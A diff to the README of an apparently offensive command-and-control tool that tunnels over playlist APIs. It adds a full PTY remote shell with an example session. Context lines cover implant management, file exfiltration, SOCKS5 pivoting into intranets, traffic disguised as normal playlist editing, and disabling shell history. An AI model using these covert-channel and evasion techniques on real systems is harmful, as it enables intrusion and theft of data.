@@ -28,7 +28,8 @@ More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amb
 
 ### C2 Framework
 - **Multi-agent support** -- `agents`, `attach <id>`, `detach` for managing multiple implants
-- **Interactive shell** (`ishell`) -- remote shell with command queuing, auto-detects bash/powershell
+- **Full PTY shell** (`pty`) -- a real pseudo-terminal over the C2 channel: tab completion, vim, top, Ctrl+C, window resize. Keystrokes are batched to save round trips; falls back gracefully to `ishell` if the platform can't allocate a PTY
+- **Interactive shell** (`ishell`) -- line-based remote shell with command queuing, auto-detects bash/powershell
 - **Direct shell on attach** -- type commands directly when attached (no `shell` prefix needed)
 - **SOCKS5 tunnel** (`tunnel [port]`) -- pivot through the implant: local SOCKS5 proxy multiplexed over the C2 channel, reach hosts only the target can see
 - **Live-session mode** (`--live`) -- edit-in-place session playlists: 1 API call per message instead of 2, direct-GET polling, traffic that looks like normal playlist editing
@@ -324,7 +325,8 @@ Agent management:
   detach          Detach from current agent
 
 Commands (when attached, type directly or use prefix):
-  ishell          Interactive remote shell (auto-detects bash/powershell)
+  pty             Full interactive terminal (Ctrl+] to exit)
+  ishell          Line-based remote shell (lighter than pty)
   <any command>   Sent as shell command to attached agent
   exfil <path>    Exfiltrate a file
   push <l> <r>    Push local file <l> to remote path <r>
@@ -384,6 +386,25 @@ Other:
 # In another terminal — reach hosts only the implant can see:
 curl --socks5 127.0.0.1:1080 http://intranet.target.corp/
 ```
+
+### Full PTY Shell
+
+```
+[15:42] Kepler@target.local > pty
+[*] PTY session active — Ctrl+] to exit
+
+admin@target.local:~$ cd /var<TAB>        # real tab completion
+admin@target.local:/var$ top              # full-screen programs work
+admin@target.local:/var$ vim notes.txt    # so does vim
+admin@target.local:/var$ ^]               # Ctrl+] exits
+[*] PTY session closed
+```
+
+A real pseudo-terminal (creack/pty: bash/sh on Unix, ConPTY on Windows)
+streamed over the C2 channel. Keystrokes are batched (400ms / 200 bytes)
+to conserve messages, terminal resizes are forwarded (SIGWINCH), and the
+session runs with `HISTFILE=/dev/null`. Pair with `--live` for the most
+responsive experience; falls back to `ishell` if no PTY is available.
 
 ## Security Model
 
